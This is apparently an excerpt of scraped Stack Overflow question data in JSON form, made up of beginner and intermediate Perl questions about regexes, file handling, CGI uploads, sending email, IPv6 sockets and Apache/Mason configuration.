</p>\n"},{"tags":["perl","bash","shell","unix","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12430243,"title":"How to add a string(s) after a specific string is read?","body":"<p>I want to write a script to be executed in the terminal.</p>\n\n<p>I'm editing xml files and I want to add a string or strings after the head of the xml column is detected..</p>\n\n<p>Here is a sample xml</p>\n\n<pre><code>bunch of line\nmore unimportant lines\nand they can very in number\n&lt;States&gt;\n&lt;item1&gt; something something &lt;/item1&gt;\n\n&lt;item2&gt; something something &lt;/item1&gt;\n\n&lt;item3&gt; something something &lt;/item1&gt;\n&lt;/states&gt;\n</code></pre>\n\n<p>Now I want to add an item 4. However, I want it to be inserted before item1.</p>\n\n<p>Idealy, the file would when look like: </p>\n\n<pre><code>bunch of line\nmore unimportant lines\nand they can very in number\nand even some lines were added here\nand here\nand here\n&lt;States&gt;\n&lt;item4&gt; something something &lt;/item1&gt;\n&lt;item1&gt; something something &lt;/item1&gt;\n\n&lt;item2&gt; something something &lt;/item1&gt;\n\n&lt;item3&gt; something something &lt;/item1&gt;\n&lt;/states&gt;\n</code></pre>\n\n<p>Note that there was other stuff added to the top that is irrelevent to the code. These are comments that are going to be going in.</p>\n\n<p>I am open to doing this in perl, but shell would be even better.</p>\n"},{"tags":["json","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12430748,"title":"JSON::XS complains if a key is not quoted","body":"<p>I get back JSON in this format:</p>\n\n<pre><code>{key1:\"value1\", key2:\"value2\"} \n</code></pre>\n\n<p>If I try to use JSON::XS' decode_json method to convert it for me but it's complaining that the keys are not quoted. Is there an option I can set in JSON::XS to ignore this quirk? I looked at the docs but there was nothing obvious.</p>\n"},{"tags":["perl","networking","drive","file-find"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":100,"score":3,"question_id":12428029,"title":"Reading Files from Network Drives in Perl","body":"<p>I am working on a perl script which does a document inventory for pdfs in all directories starting from some root directory on our network.  The script runs fine locally, but I can't get it to read files from the network drive.  i have strawberryperl</p>\n\n<p>this is the beginning of my code</p>\n\n<pre><code>use strict;\nuse Excel::Writer::XLSX;\nuse Cwd;\nuse Tk;\nuse File::Find;\n\nmy @analystreports;\nmy @directories;\n</code></pre>\n\n<p>I used the Tk Gui to get a directory</p>\n\n<pre><code>my $homeDir  = Tk::MainWindow-&gt;new-&gt;chooseDirectory;\n</code></pre>\n\n<p>capture all files and folders in current directory</p>\n\n<pre><code>find(\\&amp;grabPDF, $homeDir);\n\nsub grabPDF {\n\n    my $file = $_;\n    if ($file =~ /\\.pdf/g) {\n\n        push @analystreports, $File::Find::name;\n    }\n}\n</code></pre>\n\n<p>my network drive looks like this in net use</p>\n\n<p>Local N: Remote \\abc-file-01\\shared data</p>\n\n<p>Please excuse my beginner code.  My question is whether I'm doing something wrong with a network drive or if I have to ask our administrator for privileges.  Thanks a ton, Dan</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":158,"score":-2,"question_id":7353736,"title":"Finding the n'th occurrence of a match in line with perl","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/7352299/finding-the-n-th-occurrence-of-a-match-line\">Finding the N th Occurrence of a Match line</a>  </p>\n</blockquote>\n\n\n\n<p>I have multi-line text with:</p>\n\n<ul>\n<li>ship</li>\n<li>plane</li>\n<li>ship</li>\n<li>car</li>\n</ul>\n\n<p>I want to find the 1st occurrence of \"ship\" in a line and output:</p>\n\n<blockquote>\n  <p>The ship is a 1'st one.</p>\n</blockquote>\n\n<p>I want find 2nd occurrence of \"ship\" in a line and output:</p>\n\n<blockquote>\n  <p>The ship is a 2'nd one.</p>\n</blockquote>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12429135,"title":"How to delete slash from the str?","body":"<p>How to delete slash from the str? Need the solution on perl.\nI tried </p>\n\n<pre><code>        ($phot) = $photos =~ s/\\///g;\n</code></pre>\n\n<p>But it doesn't work</p>\n"},{"tags":["regex","windows","osx","perl","data"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12428436,"title":"why does my perl program that works in windows not work in mountain lion on my mac?","body":"<p>I have written a perl program which reads some data (the data are names which include alphanumeric characters which are split by an underscore, such as SDF_233), i read that data in using</p>\n\n<pre><code>use strict;\nuse warnings;\nuse LWP::Simple;\n\nmy $file = \"names.txt\";\nopen(DATA,$file);\nmy @lines=&lt;DATA&gt;;\nclose DATA;\n\nforeach my $line (@lines) {\nmy $name = $line; \nmy $otherdata;  ...some more code...\n\nprint $name . \",\" . $otherdata;}\n</code></pre>\n\n<p>I print $name so that i can use it as a reference to double check the program has gone through every name when i compare back to the original list.</p>\n\n<p>Q: This works on windows - I tried the same thing on my Mac but it doesn't work. I get no output for $name, but $otherdata does print - why is this? does the underscore have something to do with this?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":387,"score":0,"question_id":7377105,"title":"perl script sendMail","body":"<p>I need to write a perl script for sending emails. \nThe script should read .txt document containing the e-mail addresses as its first argument (there could be more than one address, and they are all separated with \";\")  and an .html document that should be the body of the e-mail as its second. </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse Net::SMTP::SSL;\n\nsub send_mail {\n\n    my $to = $ARGV[0];\n    open(MYFILE, $to) || die(\"Could not open file!\");\n    @recepients=&lt;MYFILE&gt;;\n    close(MYFILE);\n\n    my $body = $ARGV[1];\n    open (TXTFILE, $body);\n    @lines = &lt;TXTFILE&gt;;\n    close(TXTFILE);\n    $body = join(\"\",@lines);\n\n    my $from = 'theAddress@gmail.com';\n    my $password = 'thePassword';\n\n    my $smtp;\n\n    if (not $smtp = Net::SMTP::SSL-&gt;new('smtp.gmail.com',\n                            Port =&gt; 465,\n                            Debug =&gt; 1)) {\n        die \"Could not connect to server\\n\";\n    }\n\n    $smtp-&gt;auth($from, $password) || die \"Authentication failed!\\n\";\n\n    $smtp-&gt;mail($from . \"\\n\");\n\n    my @recepients = split(/;/, $to);\n    foreach my $recp (@recepients) {\n        $smtp-&gt;to($recp . \"\\n\");\n    }\n    $smtp-&gt;data();\n    $smtp-&gt;datasend(\"From: \" . $from . \"\\n\");\n    $smtp-&gt;datasend(\"To: \" . $to . \"\\n\");\n    $smtp-&gt;datasend(\"Subject: \" . $subject . \"\\n\");\n    $smtp-&gt;datasend(\"\\n\");\n    $smtp-&gt;datasend($body . \"\\n\");\n    $smtp-&gt;dataend();\n    $smtp-&gt;quit;\n}\n\n&amp;send_mail()\n</code></pre>\n\n<p>So I tried to work something out, but I have a problem with extracting the information both from the .txt and .html documents. So the error should be somewhere at the splitting of the recipients.</p>\n"},{"tags":["perl","oracle10g"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12426683,"title":"PDF file stored as BLOB, view in a webpage perl","body":"<p>I have a code that handles displaying a blob from a local Oracle database. I store both JPG and PDF files as blob. I could view the JPG file, but not the PDF. I have checked these</p>\n\n<pre><code>$self-&gt;content_type('image/jpg')\n</code></pre>\n\n<p>to</p>\n\n<pre><code>$self-&gt;content_type('application/pdf'). \n</code></pre>\n\n<p>And the Blob does have data. I checked the length and it has \"184546\". \nAll I get when I click the link for the pdf file is a blank page with the title GETIMAGPAGE(application/pdf). </p>\n\n<p>Any help or pointers would be greatly appreciated. </p>\n\n<p>Also, How can we have the content_type to enable two different mime_types? For example in my case both image as well as pdf, depending on what we get?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":12426956,"title":"Getting values from a hash by order defined in another list","body":"<p>Looking for a way, how to get the values from a hash, in an order defined by another list.</p>\n\n<p>The \"demo\" code (real values are different):</p>\n\n<pre><code>use 5.014;\nuse warnings;\n\nmy $href = {\n    'Long one' =&gt; 'v1',\n    'xxx two'  =&gt; 'v2',\n    'another3' =&gt; 'v3',\n    'xfour'    =&gt; 'v4',\n    'some5'    =&gt; undef,\n};\n\n#keys from the $href in defined order\nmy @order = ('Long one', 'xfour', 'nono', 'another3', 'some5', 'xxx two');\n\n#in the real code:\n#my $href = some_sub(......);  my @order = another_sub(....);\n\n#cleanup the @order form undefined values\n@order = grep { exists $href-&gt;{$_} &amp;&amp; defined $href-&gt;{$_} } @order;\n\n#my input\nwhile(&lt;DATA&gt;) {\n    chomp;\n\n    #filter out nonexistent keys and undefined values\n    my @defined_data = grep { exists $href-&gt;{$_} &amp;&amp; defined $href-&gt;{$_} } split '/';\n\n    my $str = \"xx\";\n    $str = join('/',\n               map { $href-&gt;{$_} }  some_my_sort(@defined_data)\n    ) if @defined_data;\n\n    say $str;\n}\n\nsub some_my_sort {\n    my(@list) = @_;\n\n    # \"somewhat\"sort the @list in order defined by @order\n    # haven't any idea how to do this :(\n\n    # __HERE NEED HELP__ to sort the @list, to the order defined in the @order\n\n    #and get only first two values. if exists only one value, return only one\n    if($#list &gt; 0) {\n        return ($list[0], $list[1]);\n    }\n    else {\n        return($list[0]);\n    }\n}\n\n__DATA__\nanother3/some5/Long one/xfour/xxx two\nxxx two/blabla/some5/another3/xfour\nsome5\nnotexists/some5/xxx two/Long one\nsome5/another3\n</code></pre>\n\n<p>for the above input want get the next output:</p>\n\n<pre><code>v1/v4\nv4/v3\nxx\nv1/v2\nv3\n</code></pre>\n\n<p>Form @ikegami solution:</p>\n\n<pre><code>use 5.014;\nuse warnings;\n\nmy $href = { 'Long one' =&gt; 'v1', 'xxx two'  =&gt; 'v2', 'another3' =&gt; 'v3', 'xfour'    =&gt; 'v4', 'some5'    =&gt; undef, };\nmy @order = ('Long one', 'xfour', 'nono', 'another3', 'some5', 'xxx two');\n@order = grep { exists $href-&gt;{$_} &amp;&amp; defined $href-&gt;{$_} } @order;\n\nmy %order = map { $order{$_} =&gt; $_ } 0..$#order;\nwhile (&lt;DATA&gt;) {\n    chomp;\n    my @keys = grep { defined $href-&gt;{$_} } split '/';\n    @keys = sort { $order{$a} &lt;=&gt; $order{$b} } @keys;\n    splice(@keys, 2) if @keys &gt; 2;\n    @keys = 'xx' if !@keys;\n    say join '/', @{$href}{ @keys };\n}\n</code></pre>\n\n<p>get the next - error - and don't really understand why:</p>\n\n<pre><code>Global symbol \"%order\" requires explicit package name at ike line 8.\nExecution of ike aborted due to compilation errors.\n</code></pre>\n"},{"tags":["java","perl","ubuntu"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12427530,"title":"How to execute perl script from java in ubuntu","body":"<p>I have a perl script that needs 2 arguments to be run. I am currently using Ubuntu and I managed to execute the perl script from terminal by changing directory to where the perl script exists and by writing</p>\n\n<pre><code>perl tool.pl config=../mydefault.config file=../Test\n</code></pre>\n\n<p>However, when I am trying to run the perl script from my java program (I am using eclipse), It always gives me the message <code>Command Failure</code>. This is the code :</p>\n\n<pre><code>Process process;\ntry {\n    process = Runtime.getRuntime().exec(\"perl /home/Leen/Desktop/Tools/bin/tool.pl config=../mydefault.config file=../Test\");\n    process.waitFor();\n    if(process.exitValue() == 0) {\n        System.out.println(\"Command Successful\");\n    } else {\n        System.out.println(\"Command Failure\");\n    }\n} catch(Exception e) {\n    System.out.println(\"Exception: \"+ e.toString());\n}\n</code></pre>\n\n<p>So please what is wrong in my code?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":52,"score":-1,"question_id":12426757,"title":"One-liner to extract digits from a string","body":"<p>I am learning Perl regex, and I am trying to extract digits from a string, e.g.</p>\n\n<pre><code>my $text = \"abc000142gh\";\n</code></pre>\n\n<p>i.e. I would like to extract <code>000142</code> as a string in a scalar variable.</p>\n\n<p>I have tried:</p>\n\n<pre><code>my $digits = $text ~= /(+d)/;\nmy $digits = $text ~= m/(+d)/;\nmy $digits = $text ~= m/(+d)/g;\nmy $digits = $text ~= /(+d)/g;\n</code></pre>\n\n<p>but none of them seem to work. Is there a way to do this with a one-liner?</p>\n"},{"tags":["windows","perl","ipv6"],"answer_count":0,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":11753595,"title":"IPv6 with perl on windows not working","body":"<p>cross-post <a href=\"http://perlmonks.org/index.pl?node_id=984750\" rel=\"nofollow\">http://perlmonks.org/index.pl?node_id=984750</a></p>\n\n<p>(Possible duplicate of <a href=\"http://stackoverflow.com/questions/11348206/perl-windows-ipv6\">perl windows IPv6</a> )\nI tried following sample example from : <a href=\"https://metacpan.org/module/IO::Socket::IP\" rel=\"nofollow\">https://metacpan.org/module/IO::Socket::IP</a></p>\n\n<pre><code>use IO::Socket::IP -register;\n\nmy $sock = IO::Socket-&gt;new(\n   Domain    =&gt; PF_INET6,\n   LocalHost =&gt; \"::1\",\n   Listen    =&gt; 1,\n) or die \"Cannot create socket - $@\\n\";\n\nprint \"Created a socket of type \" . ref($sock) . \"\\n\";\n</code></pre>\n\n<p>It is giving output as : \nCannot create socket - no address associated with nodename</p>\n\n<p>I am using ActiveState perl 5.14.2 and have built IO::Socket::IP module on it.</p>\n\n<p>Following is the ping result:</p>\n\n<pre><code>c:\\&gt;ping ::1\n\nPinging ::1 with 32 bytes of data:\nReply from ::1: time&lt;1ms\nReply from ::1: time&lt;1ms\nReply from ::1: time&lt;1ms\nReply from ::1: time&lt;1ms\n\nPing statistics for ::1:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n</code></pre>\n\n<p>If I use the IPv4 style loopback address 127.0.0.1, the above code works well.\nI am wondering what I am missing.</p>\n\n<p>Update:</p>\n\n<p>I just cleaned the perl setup and path, and freshly installed perl 5.14.2 from\n<a href=\"http://www.activestate.com/activeperl/downloads\" rel=\"nofollow\">http://www.activestate.com/activeperl/downloads</a></p>\n\n<p>and then I tried following simple code:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Socket qw(getaddrinfo SOCK_STREAM AI_PASSIVE  );\n\nmy ( $err, @res ) = getaddrinfo( \"::\", 8086, {\n    socktype =&gt; SOCK_STREAM,\n    flags =&gt; AI_PASSIVE,\n} );\ndie $err if $err;\n</code></pre>\n\n<p>it ended with following error:\nno address associated with nodename at c:\\IPv6.pl line 10.</p>\n\n<p>But with 127.0.0.1 it returns proper value.</p>\n\n<p>I am using windows 2008 R2 box, a same run on my another windows box also fails.</p>\n\n<p>I just tried to trace this call in Socket.pm, and found that a \"fake_getaddrinfo\" is getting called instead of the real getaddrinfo. It seems the XSLoader was either not able to find/load getaddrinfo from Socket.dll or Socket.dll didn't at all have the getaddrinfo.\nWhat could be the reason?</p>\n\n<p>A similar code below using Socket6 works properly on the same setup:</p>\n\n<pre><code>use Socket;\nuse Socket6;\n\n@res = getaddrinfo('::', 8086, AF_UNSPEC, SOCK_STREAM);\n\nwhile(scalar(@res)&gt;=5){\n\n    ($family, $socktype, $proto, $saddr, $canonname, @res) = @res;\n    ($host, $port) = getnameinfo($saddr, NI_NUMERICHOST | NI_NUMERICSERV);\n    print (\"\\nhost= $host port = $port\");\n    socket(Socket_Handle, $family, $socktype, $proto) || next;\n    bind(Socket_Handle,$saddr  )  || die \"bind: $!\";\n    listen(Socket_Handle, 5) || die \"listen: $!\";\n\n    ($host, $port) = getnameinfo($saddr, NI_NUMERICHOST | NI_NUMERICSERV);\n    print (\"\\nReady for connections \\nhost= $host port = $port\");\n    $paddr = accept(Client, Socket_Handle);\n}\n</code></pre>\n\n<p>So I can't even blame the setup or the system dlls. Is there an issue with perl's built-in IPv6 support for windows' activestate build?</p>\n"},{"tags":["perl","upload","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12424119,"title":"CGI upload creates empty file","body":"<p>Hi I'm trying to upload a file using CGI and although the CGI script runs, the file that is created is empty.</p>\n\n<p>I have a html file which gets the file name and passes it to a cgi script:</p>\n\n<pre><code>&lt;html&gt;\n&lt;body&gt;\n\n&lt;form enctype=\"multipart/form-data\" action=\"cgi-bin/upload.pl\" method=\"POST\"&gt;\n&lt;input type=\"FILE\" name=\"file\"&gt;\n&lt;input type=\"submit\"&gt;\n&lt;/form&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>The cgi script is as follows:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse CGI::Carp qw(fatalsToBrowser warningsToBrowser);\nuse CGI;\n\nprint \"Content-type: text/html\\n\\n\";\n\nmy $cgi = new CGI;\nmy $dir = 'sub';\n\nmy $name = $cgi-&gt;param('file');\nprint \"name: $name &lt;br /&gt;\\n\";\nopen(LOCAL, \"&gt;$dir/$name\") or die \"error: failed to open $dir/$name\\n\";\nmy $file_handle = $cgi-&gt;upload('file');\ndie \"file_handle not defined\\n\" unless(defined($file_handle));\nwhile(&lt;$file_handle&gt;) {\n    print $_;\n    print LOCAL $_;\n}\nclose($file_handle);\nclose(LOCAL);\n\nprint \"done\\n\";\n</code></pre>\n\n<p>The cgi script runs OK, produces no warnings, manages to create a local file and correctly gets the remote file name. However, the script appears not to read any data from the file or write any data into the local file which is empty.</p>\n\n<p>I'm definitely uploading a file that contains multiple lines of data but the output of the cgi script is as follows:</p>\n\n<pre><code>   name: tmp.txt \n   done\n</code></pre>\n\n<p>Any help greatly appreciated...</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":66,"score":-3,"question_id":12423437,"title":"how print out the output in a new file perl","body":"<p>How can I print in a directory the output of the variable $newFile ? How can I use 'cp' to do that ?\nAfter modifications, my code looks like this :</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\nuse File::Copy 'cp';\n\n# binmode(STDOUT, \":utf8\") ;\n# warn Dumper \\@repertoire;\n\nmy @rep= glob('/home/test/Bureau/Perl/Test/*'); # output to copy in this dir\nforeach my $file (@rep)\n{\n    open(IN, $file) or die \"Can't read file '$file' [$!]\\n\";\n    while (&lt;IN&gt;)\n    {\n    my ($firstCol, $secondCol) = split(/\",\"/, $_); \n\n    $firstCol =~ s/http:\\/\\//_/g;\n    $secondCol =~ s/\\(.+\\)/ /ig;\n    my $LCsecondCol = lc($secondCol);\n    chomp($secondCol);\n    chomp($LCsecondCol);\n    my $newFile = \"$firstCol:($secondCol|$LCsecondCol);\";\n    $newFile =~ s/=//g;\n    print \"$newFile\\n\";\n\n    }\n    close(IN);\n}\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12423337,"title":"How to pass a replacing regex as a command line argument to a perl script","body":"<p>I am trying to write a simple perl script to apply a given regex to a filename among other things, and I am having trouble passing a regex into the script as an argument. </p>\n\n<p>What I would like to be able to do is somthing like this:</p>\n\n<pre><code>&gt; myscript 's/hi/bye/i' hi.h\nbye.h\n&gt;\n</code></pre>\n\n<p>I have produced this code</p>\n\n<pre><code>#!/utils/bin/perl -w\nuse strict;\nuse warnings;\n\nmy $n_args = $#ARGV + 1;\nmy $regex =  $ARGV[0];\nfor(my $i=1; $i&lt;$n_args; $i++) {\n  my $file = $ARGV[$i];\n\n  $file =~ $regex;\n  print \"OUTPUT: $file\\n\";\n}\n</code></pre>\n\n<p>I cannot use qr because apparently it cannot be used on replacing regexes (although my source for this is a forum post so I'm happy to be proved wrong).</p>\n\n<p>I would rather avoid passing the two parts in as seperate strings and manually doing the regex in the perl script.</p>\n\n<p>Is it possible to pass the regex as an argument like this, and if so what is the best way to do it?</p>\n"},{"tags":["perl","operators","boolean"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":98,"score":3,"question_id":12419036,"title":"Why might one evaluate `defined $x && $x` in boolean context?","body":"<pre><code>my $target_type = (defined($item-&gt;{target_type}) &amp;&amp; $item-&gt;{target_type}) \n                ? $item-&gt;{target_type} \n                : \"\";\n\nmy $target_id   = (defined($item-&gt;{target_id}) &amp;&amp; $item-&gt;{target_id})\n                ? $item-&gt;{target_id} \n                : \"\";\n</code></pre>\n\n<p>Why did the developer use <code>&amp;&amp;</code> with almost the same conditions?  </p>\n"},{"tags":["perl","parsing","url","uri"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12425393,"title":"Perl parse url to get the value using","body":"<p>How to get the value of a parameter 'code' using URI::URL perl module from this link:\n<a href=\"http://www.someaddress.com/index.html?test=value&amp;code=INT_12345\" rel=\"nofollow\">http://www.someaddress.com/index.html?test=value&amp;code=INT_12345</a>\nIt can be done using URI::URL or URI (I know the first one is kind of obsolete). Thanks in advance.</p>\n"},{"tags":["perl","apache","configuration","mason"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":177,"score":1,"question_id":5702951,"title":"Mason and Apache configuration, loading files that don't exist","body":"<p>I have a really strange behavior while using Mason,<br>\nFor example:</p>\n\n<p>I have an index.html file ( that contains mason tags like &lt;% $var %> hello ).</p>\n\n<p>When I'm browsing to \"http://bla.com/index.html\" - the variable is translated during compilation.</p>\n\n<p>But there's a strange behavior when I'm browsing to \"http://bla.com/index\"\nThough there's no file called \"index\" ( only index.html ) it still loads \"index.html\" and the entire code is shown as plain/text including the \"&lt;% ... %>\" !!!</p>\n\n<p>What have I configured wrong ?</p>\n\n<p>this is my Apache configuration:</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n        ServerAdmin webmaster@abc.com\n        ServerAlias abc.com www.abc.com\n        ServerName abc.com\n\n\n        DocumentRoot /var/www/abc.com\n        DirectoryIndex index.html\n\n        &lt;Directory \"/var/www/abc.com/\"&gt;\n                Options FollowSymLinks MultiViews\n                AllowOverride All\n\n                Order allow,deny\n                allow from all\n        &lt;/Directory&gt;\n\n        SetHandler perl-script\n        PerlModule HTML::Mason::ApacheHandler\n        PerlSetVar MasonUseObjectFiles 1   \n\n        &lt;LocationMatch \"(\\.html|\\.txt|\\.pl|\\.js)$\"&gt;\n                SetHandler perl-script\n                PerlHandler HTML::Mason::ApacheHandler\n        &lt;/LocationMatch&gt;\n\n        &lt;LocationMatch \"(\\.m(html|txt|pl)|dhandler|autohandler)$\"&gt;\n                SetHandler perl-script\n                PerlHandler Apache::Constants::NOT_FOUND\n        &lt;/LocationMatch&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["regex","perl","xpath","selenium","apostrophe"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1002,"score":5,"question_id":3124785,"title":"How do I escape an apostrophe in my XPath text query with Perl and Selenium?","body":"<p>I have an XPath query which needs to match some text in a span attribute, as follows:</p>\n\n<pre><code>my $perl_query = qq(span[text\\(\\)='It's a problem']);\n\n$sel-&gt;click_ok($perl_query);\n</code></pre>\n\n<p>Where the text has no apostrophe there is no problem.</p>\n\n<p>I've tried the following instead of 'It's a problem':</p>\n\n<pre><code>'It\\'s a problem'\n'It&amp;apos\\;s a problem'\n'It\\${apos}s a problem'  #some thread on Stackoverflow suggested that this was a solution implemented by Selenium, but it doesn't work.\n</code></pre>\n\n<p>Any ideas?</p>\n\n<p>On a different note, if I can't solve this, I'd be happy enough matching 'a problem' but not sure how to do regex matching in XPath with Selenium.</p>\n\n<p>Thanks for any pointers</p>\n"},{"tags":["regex","perl","table"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":103,"score":2,"question_id":11856555,"title":"Perl program for tabulation","body":"<p><strong>F1.txt</strong></p>\n\n<pre><code>tom\nx\na=1 b=2 c=3 d=4 e=5 \ny\nb=11 r=12\nbob\n\na=6 b=7 c=8 e=10\n</code></pre>\n\n<p><em><strong>result</em></strong></p>\n\n<p><strong>F2.txt</strong></p>\n\n<pre><code>.            X         Y\nname  a  b  c  d  e  b   r\n\ntom   1  2  3  4  5  11  12\n\nbob   6  7  8  -  10 -   -\n</code></pre>\n\n<p>Hello everyone, can you kindly help me in this problem of mine?  I have a file F1.txt.  My job is to convert that file into a format as shown in example F2.txt.  I tried doing this by deleting all string values after Tom and Bob except the numerical values in F1.txt, and then concatenate.  Here is the code:</p>\n\n<pre><code>use strict;\n\nopen (file100,\"&lt; data.txt\");\nopen (file101,\"&gt;&gt;F3.txt\");\n\nmy @array = &lt; file100&gt;;\n\nprint file101 \"name    a    b      c      d     e\\n\\n\";\nprint file101 \"tom @array[1]\\n\\n\";\nprint file101 \"bob @array[3]\\n\\n\";\n</code></pre>\n\n<p>Here data.txt:</p>\n\n<pre><code>tom\n\n1 2 3 4 5\n\nbob \n\n6 7 8 10\n</code></pre>\n\n<p>The output that i am getting with this code is:</p>\n\n<p>F3.txt</p>\n\n<pre><code>name  a  b  c  d  e\n\ntom   1  2  3  4  5\n\nbob   6  7  8  10\n</code></pre>\n\n<p>The expected output should be like showed in F2.txt but not like F3.txt</p>\n"},{"tags":["perl","unix","sed","awk","swap"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":59,"score":-1,"question_id":12422615,"title":"Swap with a consecutive line on a pattern match in unix","body":"<p>Can any one help me in sorting this out in sed/awk/perl</p>\n\n<p>Input file</p>\n\n<pre><code>Start variable 1\nEnd   variable 2\nA\nZ\nNext \n\nStart variable b\nEnd   variable a \nX\nY\nNext \n...\n...\n...\n\nStart variable m\nEnd   variable n\nM\nN\nNext\n</code></pre>\n\n<p>If a pattern match  <code>End</code> found, swap with its consecutive line</p>\n\n<p>Output file :</p>\n\n<pre><code>Start variable 1\nA\nEnd variable 2 \nZ\nNext\n\nStart variable b\nX\nEnd variable a\nY\nNext\n...\n...\n...\n\nStart variable m\nM\nEnd variable n\nN\nNext\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":37,"score":-2,"question_id":12422005,"title":"Email sending with perl","body":"<p>I have a perl script which sends a mail to the developer to show the status i.e. fail or pass to developer email id. I also want to get the such status mail when I am using the script. So,I tried as below ,</p>\n\n<p>TO: 'developer@abc.com , $userid@abc.com'. But in this case developer is getting the mnailbut I am still not getting it. can you Please help here?\nI am new to Perl and so it may be possible that my question is not upto the stanard.But please help,I need it urgently.</p>\n\n<p>Thanks &amp; regards,\nGautam</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12422446,"title":"perl regex to match a string and add a string next to it","body":"<p>I need to add a string in the middle of some sentences seperated by /n.\nFor Example:</p>\n\n<pre><code>INPUT          OUTPUT\nV2+count    -&gt; V2+came+count\nV6+num      -&gt; V6+came+num\nV10+hi+town -&gt; V10+came+hi+town\n</code></pre>\n\n<p>and </p>\n\n<pre><code>N2+hello    -&gt; N2+went+hello\nN7+time     -&gt; N7+went+time\n</code></pre>\n\n<p>The code I wrote so far is</p>\n\n<pre><code>if ($new=~/\\(came\\)\\|\\(went\\)/) {\n    my $prev_tag = $`;\n    if ($prev_tag5=~ /\\(V\\d+?\\)?\\+$/) {\n        $new=~ s/\\(came\\)\\|//;\n    } else {\n        $new=~s/\\(went\\)\\|//;\n    }\n}\n</code></pre>\n"},{"tags":["mysql","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12417948,"title":"Perl Insert not working","body":"<p>I am inserting some values into a MySQL database using Perl. </p>\n\n<p>After that, I am calling <code>$db-&gt;last_insert_id(undef, undef, undef, undef);</code></p>\n\n<p>It returns an ID that is not in that table.</p>\n\n<p>What's wrong with that code?</p>\n\n<p>This is my code </p>\n\n<pre><code>my $sth = $db-&gt;prepare(\"INSERT INTO accounts(user_id, cr_id, number, phone_number_id,   range, floor) VALUES(?,?,?,?,?,?)\");\n$sth-&gt;execute($uid, $car_id, $self-&gt;number(), $phone_number_id, $range, $floor);\n$id = $db-&gt;last_insert_id(undef, undef, \"accounts\", undef);\n</code></pre>\n\n<p>All variable values are set properly</p>\n"},{"tags":["perl","imagemagick","imagemagick-convert"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12421320,"title":"How can I write this command line command in Perl using the ImageMagick API?","body":"<p>How can I do the same as the following command line command in Perl using the ImageMagick API? </p>\n\n<pre><code>convert scotland.jpg[1x1+0+0] -depth 8 txt:\n</code></pre>\n\n<p>The result should look similar to this:</p>\n\n<pre><code># ImageMagick pixel enumeration: 1,1,255,rgb\n0,0: ( 48, 50, 47)  #30322F  rgb(48,50,47)\n</code></pre>\n"},{"tags":["perl","bash","ubuntu","wget"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":226,"score":0,"question_id":12417997,"title":"Why isn't this perl script to save a youtube video, using wget, working correctly?","body":"<p>The first argument should be the url of the video.  Can anyone point out to me why this isn't working?</p>\n\n<p>I launched one of these ec2 instances of ubuntu 12.04 which has perl and wget installed already\n<a href=\"http://cloud-images.ubuntu.com/precise/current/\" rel=\"nofollow\">http://cloud-images.ubuntu.com/precise/current/</a></p>\n\n<p><strong>This script originates from here:</strong>\n<a href=\"https://calomel.org/youtube_wget.html\" rel=\"nofollow\">https://calomel.org/youtube_wget.html</a></p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\n## collect the 